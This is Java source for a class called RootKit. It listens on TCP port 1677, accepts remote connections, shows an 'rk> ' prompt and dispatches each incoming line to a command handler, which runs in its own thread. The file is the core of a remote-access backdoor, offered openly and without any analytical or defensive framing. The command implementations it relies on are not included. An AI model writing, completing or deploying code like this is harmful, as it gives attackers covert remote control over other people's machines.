import commands.AbstractCommand;
import exceotions.AbstractRkException;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class RootKit extends Thread {
    private static final Integer PORT = 1677;

    private static final String ROOT_TAG = "rk> ";

    Socket socket;

    public RootKit(Socket socket) {
        this.socket = socket;
    }

    public static void main(String[] args) throws IOException {
        try(ServerSocket serverSocket = new ServerSocket(PORT)) {
            while (true) {
                Socket socket = serverSocket.accept();
                new RootKit(socket).start();
            }
        }
    }

    public void run() {
        try(Scanner scanner = new Scanner(socket.getInputStream());) {
            PrintWriter printWriter = new PrintWriter(socket.getOutputStream(), true);
            printWriter.print(ROOT_TAG);
            while (scanner.hasNextLine()) {
                try {
                    String str = scanner.nextLine();
                    AbstractCommand command = AbstractCommand.getCommand(str);
                    command.setSocket(socket);
                    Thread thread = new Thread(command);
                    thread.start();
                    thread.join();
                } catch (AbstractRkException rkException) {
                    printWriter.println(rkException.getMessage());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}